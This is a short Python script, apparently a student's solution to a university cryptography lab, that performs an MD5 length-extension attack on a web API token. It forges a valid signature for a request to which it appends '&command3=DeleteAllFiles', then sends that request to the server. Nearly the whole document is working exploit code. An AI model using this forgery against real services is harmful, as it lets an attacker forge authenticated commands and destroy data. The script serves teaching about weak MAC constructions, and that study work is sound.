import httplib, urlparse, sys, urllib
from pymd5 import md5, padding

url = sys.argv[1]
#url = "http://www.cs.bu.edu/~goldbe/teaching/HW55814/lab1/api?token=11ed1b5786c5fc4d4fa4294f4d281df1&user=sgoldberg&command1=ListFiles&command2=NoOp"


# Init data
parsedUrl = urlparse.urlparse(url)
pwlen = 8
signature = parsedUrl.query[6:38]
msg = parsedUrl.query[39:]
add = "&command3=DeleteAllFiles"

# Find padding
bits = padding((len(msg) + pwlen) * 8)
h = md5(state=signature.decode("hex"), count=512)
h.update(add)

# Altered token and message
temp = parsedUrl.query[:6] + h.hexdigest() + parsedUrl.query[38:] + urllib.quote(bits) + add


conn = httplib.HTTPConnection(parsedUrl.hostname)
conn.request("GET", parsedUrl.path + "?" + temp)
print conn.getresponse().read()
